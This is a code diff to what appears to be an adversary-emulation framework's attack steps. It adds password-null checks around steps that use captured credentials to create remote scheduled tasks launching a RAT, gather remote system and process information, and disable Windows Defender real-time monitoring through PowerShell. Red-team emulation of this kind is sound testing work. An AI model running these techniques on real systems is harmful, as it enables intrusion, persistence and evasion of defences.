@@ -689,25 +689,28 @@ class Schtasks(Step):
 
     @staticmethod
     async def action(operation, rat, time_delta, dest_host, user, rat_file, cred, domain, schtask_g, rat_g):
-        delta = timedelta(seconds=time_delta['seconds'],
+        if cred.password is not None:       
+                delta = timedelta(seconds=time_delta['seconds'],
                           microseconds=time_delta['microseconds'])
 
-        task_name = 'caldera_task1'
-        exe_path = rat_file.path
-        arguments = '-d'
+                task_name = 'caldera_task1'
+                exe_path = rat_file.path
+                arguments = '-d'
 
-        t = tz_utcnow() - delta + timedelta(seconds=120)
+                t = tz_utcnow() - delta + timedelta(seconds=120)
 
-        await operation.execute_shell_command(rat, *schtasks.create(task_name, exe_path, arguments=arguments,
+                await operation.execute_shell_command(rat, *schtasks.create(task_name, exe_path, arguments=arguments,
                                                                     remote_host=dest_host.fqdn,
                                                                     user=user.username, user_domain=domain.windows_domain,
                                                                     password=cred.password, start_time=t,
                                                                     remote_user="SYSTEM"))
 
-        await schtask_g({"name": task_name, 'exe_path': exe_path, "arguments": arguments, "user": user,
+                await schtask_g({"name": task_name, 'exe_path': exe_path, "arguments": arguments, "user": user,
                          "cred": cred, "start_time": t})
-        await rat_g()
-        return True
+                await rat_g()
+                return True
+        else:
+                return False
 
     @staticmethod
     async def cleanup(cleaner, schtask_g):
@@ -1496,28 +1499,31 @@ class SysteminfoRemote(Step):
 
     @staticmethod
     async def action(operation, rat, host, dest_host, cred, user, domain, host_g, domain_g, os_version_g):
-        info = await operation.execute_shell_command(rat, *systeminfo.csv(remote_host=dest_host.fqdn,
+        if cred.password is not None:
+                info = await operation.execute_shell_command(rat, *systeminfo.csv(remote_host=dest_host.fqdn,
                                                                           user_domain=domain.windows_domain,
                                                                           user=user.username,
                                                                           password=cred.password))
 
-        # Domain info  -- kind of redundant to leave this in for the remote technique.
-        await domain_g({'windows_domain': info['Domain'].split('.')[0], 'dns_domain': info['Domain']})
+                # Domain info  -- kind of redundant to leave this in for the remote technique.
+                await domain_g({'windows_domain': info['Domain'].split('.')[0], 'dns_domain': info['Domain']})
 
-        # Add info about our current host. If we need more host information pulled with systeminfo in the future add it
-        # here.
-        host_fqdn = '.'.join([info['Host Name'], info['Domain']]).lower()
-        os_version = await os_version_g({**info['parsed_version_info']})
-        await host_g({'hostname': info['Host Name'].lower(), 'dns_domain_name': info['Domain'], 'fqdn': host_fqdn,
+                # Add info about our current host. If we need more host information pulled with systeminfo in the future add it
+                # here.
+                host_fqdn = '.'.join([info['Host Name'], info['Domain']]).lower()
+                os_version = await os_version_g({**info['parsed_version_info']})
+                await host_g({'hostname': info['Host Name'].lower(), 'dns_domain_name': info['Domain'], 'fqdn': host_fqdn,
                       'system_info': info['_original_text'], 'os_version': os_version})
 
-        # If the RAT is running in a Domain user's context we can find a DC with this (does nothing if we're SYSTEM):
-        if info['Logon Server'] != 'N/A':
-            logon_server_fqdn = '.'.join([info['Logon Server'].strip('\\\\'), info['Domain']]).lower()
-            await host_g({'fqdn': logon_server_fqdn, 'hostname': info['Logon Server'].strip('\\\\').lower(),
+                # If the RAT is running in a Domain user's context we can find a DC with this (does nothing if we're SYSTEM):
+                if info['Logon Server'] != 'N/A':
+                    logon_server_fqdn = '.'.join([info['Logon Server'].strip('\\\\'), info['Domain']]).lower()
+                    await host_g({'fqdn': logon_server_fqdn, 'hostname': info['Logon Server'].strip('\\\\').lower(),
                           'dns_domain_name': info['Domain']})
 
-        return True
+                return True
+        else:
+                return False
 
 
 class TasklistLocal(Step):
@@ -1605,39 +1611,41 @@ class TasklistRemote(Step):
 
     @staticmethod
     async def action(operation, rat, host, cred, user, domain, process_g, host_g):
-        processes = await operation.execute_shell_command(rat, *tasklist.main(verbose=True,
+        if cred.password is not None:        
+                processes = await operation.execute_shell_command(rat, *tasklist.main(verbose=True,
                                                                               remote_host=host.hostname,
                                                                               user_domain=domain.windows_domain,
                                                                               user=user.username,
                                                                               password=cred.password))
-        # Add host to process dictionaries
-        [proc.update({'host': host}) for proc in processes]
+                # Add host to process dictionaries
+                [proc.update({'host': host}) for proc in processes]
 
-        is_equivalent = lambda proc1, proc2: True if (proc1['pid'] == proc2['pid'] and
+                is_equivalent = lambda proc1, proc2: True if (proc1['pid'] == proc2['pid'] and
                                                       proc1['image_name'] == proc2['image_name']) else False
 
-        # Add service information to processes (use is_equivalent lambda to look for matching processes)
-        service_information = await operation.execute_shell_command(rat, *tasklist.main(services=True,
+                # Add service information to processes (use is_equivalent lambda to look for matching processes)
+                service_information = await operation.execute_shell_command(rat, *tasklist.main(services=True,
                                                                                         remote_host=host.hostname,
                                                                                         user_domain=domain.windows_domain,
                                                                                         user=user.username,
                                                                                         password=cred.password))
-        [old.update(new) if is_equivalent(old, new) else None for old in processes for new in service_information]
-        # TODO: Add service results to Observed_Services in db after change to new technique cleanup is done.
+                [old.update(new) if is_equivalent(old, new) else None for old in processes for new in service_information]
+                # TODO: Add service results to Observed_Services in db after change to new technique cleanup is done.
 
-        # Add module information to processes
-        modules_information = await operation.execute_shell_command(rat, *tasklist.main(modules=True,
+                # Add module information to processes
+                modules_information = await operation.execute_shell_command(rat, *tasklist.main(modules=True,
                                                                                         remote_host=host.hostname,
                                                                                         user_domain=domain.windows_domain,
                                                                                         user=user.username,
                                                                                         password=cred.password))
-        [old.update(new) if is_equivalent(old, new) else None for old in processes for new in modules_information]
+                [old.update(new) if is_equivalent(old, new) else None for old in processes for new in modules_information]
 
-        for proc in processes:
-            await process_g(proc)
+                for proc in processes:
+                    await process_g(proc)
 
-        return True
-
+                return True
+        else:
+                return False
 
 class DirListCollection(Step):
     """
@@ -1689,7 +1697,7 @@ class DirListCollection(Step):
                     continue
 
         return True
-
+        
 
 class ExfilAdversaryProfile(Step):
     """
@@ -1830,13 +1838,16 @@ class DisableDefenderRemote(Step):
 
     @staticmethod
     async def action(operation, rat, host, cred, user, domain, host_g):
-        ps_command = ("$username = '" + user.username + "';$password = '" + cred.password +
+        if cred.password is not None:
+                ps_command = ("$username = '" + user.username + "';$password = '" + cred.password +
                       "';$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;"
                       "$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;"
                       "Invoke-Command -ComputerName " + host.hostname +
                       " -Credential $credential -ScriptBlock {Set-MpPreference -DisableRealtimeMonitoring $true}")
-        await operation.execute_shell_command(rat, *cmd.powershell(ps_command))
-        return True
+                await operation.execute_shell_command(rat, *cmd.powershell(ps_command))
+                return True
+        else:
+                return False
 
 all_steps = Step.__subclasses__()
 all_steps.sort(key=(lambda x: x.__name__))
